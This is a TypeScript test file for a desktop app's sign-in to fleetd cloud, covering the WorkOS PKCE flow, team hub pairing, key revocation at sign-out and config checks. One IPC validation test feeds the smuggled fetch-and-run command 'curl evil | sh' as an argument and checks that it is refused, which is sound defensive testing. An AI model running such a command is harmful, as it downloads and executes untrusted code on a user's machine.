// Sign in to fleetd cloud against the repo's stand-in accounts service and WorkOS page (fleetd/test/fake-accounts.ts),
// with a browser that follows the page straight back to the app's loopback port.
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { FakeAccounts } from "../../../../../fleetd/test/fake-accounts.ts";
import { IPC } from "../../shared/channels";
import type { CallOutcome } from "../../shared/hub";
import { parseRequest } from "../../shared/ipc";
import { CloudAccount, type CloudPorts, type SavedAccount } from "./account";
import { cloudConfig, teamOrigin } from "./config";

/** The app's side of each team: its key and label, and what each hub was asked at sign-out. */
interface Hub {
  id: string;
  url: string;
  key: string;
  label: string;
  calls: string[];
  offline?: boolean;
  /** Refuses device_revoke itself (a role that may not), as a hub's tool error. */
  forbids?: boolean;
  /** The hub has refused this app's key since. */
  refused?: boolean;
}

const setup = (fake: FakeAccounts, over: Partial<CloudPorts> & { email?: string; deny?: boolean } = {}) => {
  const hubs: Hub[] = [];
  let saved: SavedAccount | null = null;
  const pages: string[] = [];
  const opened: string[] = [];
  const config = cloudConfig(fake.url, fake.clientId, true, fake.authorizeUrl);
  const ports: CloudPorts = {
    config,
    local: true,
    fetch: (url, init) => fetch(url, init),
    // The browser: WorkOS's page signs the person in and sends them back.
    open: (url) => {
      opened.push(url);
      const back = fake.authorize(url, over.email ?? "sam@acme.example", over.deny === true);
      void fetch(back).then(async (r) => pages.push(`${String(r.status)} ${await r.text()}`));
      return Promise.resolve();
    },
    deviceName: () => "devbox",
    connect: (url, key, label) => {
      hubs.push({ id: `h${String(hubs.length + 1)}`, url, key, label, calls: [] });
      return { ok: true };
    },
    cloudHubs: () =>
      hubs.map((h) => ({
        id: h.id,
        label: h.label,
        call: (tool: string, input: unknown): Promise<CallOutcome> => {
          h.calls.push(`${tool} ${JSON.stringify(input)}`);
          if (h.offline === true) return Promise.resolve({ ok: false, error: { code: "offline", message: "Not connected." } });
          if (tool === "people_list") return Promise.resolve({ ok: true, output: { people: [], devices: [], invites: [], thisDevice: `K-${h.id}` } });
          if (h.forbids === true) return Promise.resolve({ ok: false, error: { code: "forbidden", message: "Only an admin may." } });
          // As a hub does: revoking the caller's own key closes its socket (4401) before any answer, so the call fails
          // the way the client fails it, and the hub refuses the key from then on.
          h.refused = true;
          return Promise.resolve({ ok: false, error: { code: "forbidden", message: "The hub refused the key (unauthorized)." } });
        },
        refused: () => h.refused === true,
      })),
    forget: (id) => hubs.splice(hubs.findIndex((h) => h.id === id), 1),
    load: () => saved,
    save: (a) => (saved = a),
    ...over,
  };
  return { account: new CloudAccount(ports), ports, hubs, pages, opened, saved: () => saved };
};

describe("signing in to fleetd cloud", () => {
  let fake: FakeAccounts;
  beforeEach(async () => {
    fake = await new FakeAccounts().start();
  });
  afterEach(async () => {
    await fake.stop();
  });

  it("takes no arguments from the page but the hub for Connect this computer", () => {
    expect(parseRequest(IPC.cloudSignIn, []).ok).toBe(true);
    expect(parseRequest(IPC.cloudSignIn, [{ code: "x" }]).ok).toBe(false);
    expect(parseRequest(IPC.cloudConnectComputer, ["hub"]).ok).toBe(true);
    expect(parseRequest(IPC.cloudConnectComputer, ["hub", "curl evil | sh"]).ok).toBe(false);
  });

  it("first sign-in: WorkOS's page with PKCE, the person's new team made, its key kept, and only the email and session kept", async () => {
    const { account, hubs, pages, opened, saved } = setup(fake);
    expect(account.state()).toEqual({ available: true, email: null });
    const out = await account.signIn();
    expect(out).toEqual({ ok: true, email: "sam@acme.example", teams: [{ name: "sam", ok: true }] });
    const page = new URL(opened[0] ?? "");
    expect(page.searchParams.get("code_challenge_method")).toBe("S256");
    expect(page.searchParams.get("redirect_uri")).toMatch(/^http:\/\/127\.0\.0\.1:\d+\/signin\/callback$/u);
    expect(fake.signIns[0]?.deviceName).toBe("devbox");
    expect(hubs.map((h) => [h.label, h.key])).toEqual([["sam", fake.keys[0]?.key]]);
    expect(saved()).toEqual({ email: "sam@acme.example", sessionId: [...fake.sessions][0] });
    expect(Object.keys(saved() ?? {}).sort()).toEqual(["email", "sessionId"]);
    expect(account.state()).toEqual({ available: true, email: "sam@acme.example" });
    await expect.poll(() => pages[0]).toMatch(/^200 .*Signed in to fleetd/su);
  });

  it("two teams: both connect, each with its own key, and no picker", async () => {
    await fake.team("acme", ["sam@acme.example"]);
    await fake.team("side", ["sam@acme.example"]);
    const { account, hubs } = setup(fake);
    const out = await account.signIn();
    expect(out).toEqual({ ok: true, email: "sam@acme.example", teams: [{ name: "acme", ok: true }, { name: "side", ok: true }] });
    expect(hubs.map((h) => h.label)).toEqual(["acme", "side"]);
    expect(new Set(hubs.map((h) => h.key)).size).toBe(2);
  });

  it("a team whose code is refused is named; the others still connect", async () => {
    await fake.team("acme", ["sam@acme.example"]);
    await fake.team("old", ["sam@acme.example"], { refusePairing: true });
    const { account, hubs } = setup(fake);
    const out = await account.signIn();
    expect(out.ok).toBe(true);
    if (!out.ok) return;
    expect(out.teams).toEqual([
      { name: "acme", ok: true },
      { name: "old", ok: false, failure: { code: "pair_code_invalid", message: "old refused this app's code: That pairing code is unknown or was already used.", fix: "Sign in again for a new code." } },
    ]);
    expect(hubs.map((h) => h.label)).toEqual(["acme"]);
  });

  it("no team connected: a failure, nothing kept, and the session ended", async () => {
    await fake.team("old", ["sam@acme.example"], { refusePairing: true });
    const { account, hubs, saved } = setup(fake);
    const out = await account.signIn();
    expect(out.ok).toBe(false);
    expect(hubs).toEqual([]);
    expect(saved()).toBeNull();
    await expect.poll(() => fake.sessions.size).toBe(0);
  });

  it("says the service's own refusal as written", async () => {
    fake.refuseNext = { status: 429, failure: { code: "rate_limited", message: "Too many sign-ins from this address.", fix: "Wait a few minutes." } };
    const { account } = setup(fake);
    expect(await account.signIn()).toEqual({ ok: false, failure: { code: "rate_limited", message: "Too many sign-ins from this address.", fix: "Wait a few minutes." } });
  });

  it("the person cancelling on WorkOS's page connects nothing", async () => {
    const { account, hubs } = setup(fake, { deny: true });
    const out = await account.signIn();
    expect(out).toEqual({ ok: false, failure: { code: "refused", message: "The browser came back without signing you in.", fix: "Nothing was changed. Sign in again." } });
    expect(fake.signIns).toEqual([]);
    expect(hubs).toEqual([]);
  });

  it("a code is good once: the same answer sent again is refused", async () => {
    const sent: Array<{ url: string; init: RequestInit }> = [];
    const { account } = setup(fake, {
      fetch: (url, init) => {
        if (url.endsWith("/v1/app/sign-in")) sent.push({ url, init });
        return fetch(url, init);
      },
    });
    expect((await account.signIn()).ok).toBe(true);
    const [replay] = sent;
    if (replay === undefined) throw new Error("no sign-in was sent");
    const again = await fetch(replay.url, { ...replay.init, signal: null });
    expect(again.status).toBe(401);
  });

  it("Cancel stops the wait, and a page left unfinished runs out", async () => {
    const quiet = setup(fake, { open: () => Promise.resolve() });
    const waiting = quiet.account.signIn();
    await expect.poll(() => quiet.account.link()).toMatch(/^http:\/\/127\.0\.0\.1:\d+\/user_management\/authorize\?/u);
    quiet.account.cancel();
    expect(await waiting).toEqual({ ok: false, cancelled: true });
    expect(quiet.account.link()).toBeNull();
    const slow = setup(fake, { open: () => Promise.resolve(), waitMs: 20 });
    expect(await slow.account.signIn()).toMatchObject({ ok: false, failure: { code: "timeout" } });
  });

  it("sign out: this device's key revoked on each team, the hubs dropped, then the session ended", async () => {
    await fake.team("acme", ["sam@acme.example"]);
    await fake.team("side", ["sam@acme.example"]);
    await fake.team("ops", ["sam@acme.example"]);
    const { account, hubs, saved } = setup(fake);
    await account.signIn();
    const [acme, side, ops] = hubs;
    if (acme === undefined || side === undefined || ops === undefined) throw new Error("every team should have connected");
    side.offline = true;
    ops.forbids = true;
    const session = [...fake.sessions][0];
    const out = await account.signOut();
    // acme never answered its revoke, the hub closed the socket on the key it revoked: that is the revoke done.
    expect(acme.calls).toEqual(["people_list {}", 'device_revoke {"keyId":"K-h1"}']);
    expect(out).toEqual({ kept: ["ops", "side"] });
    expect(hubs).toEqual([]);
    expect(saved()).toBeNull();
    expect(fake.ended).toEqual([session]);
    expect(account.state()).toEqual({ available: true, email: null });
  });

  it("a build without both values has no Sign in", () => {
    expect(cloudConfig(undefined, "client_x", false)).toBeNull();
    expect(cloudConfig("https://accounts.fleetd.dev", undefined, false)).toBeNull();
    expect(cloudConfig("http://accounts.fleetd.dev", "client_x", false)).toBeNull();
    expect(cloudConfig("http://127.0.0.1:9", "client_x", false)).toBeNull();
    expect(cloudConfig("https://accounts.fleetd.dev/x", "client_x", false)).toBeNull();
    expect(cloudConfig("https://accounts.fleetd.dev", "client_x", false)?.accountsUrl).toBe("https://accounts.fleetd.dev");
    const off = new CloudAccount({ ...setup(fake).ports, config: null });
    expect(off.state()).toEqual({ available: false, email: null });
    expect(teamOrigin("http://acme.fleetd.dev", false)).toBeNull();
    expect(teamOrigin("https://acme.fleetd.dev", false)).toBe("https://acme.fleetd.dev");
  });
});
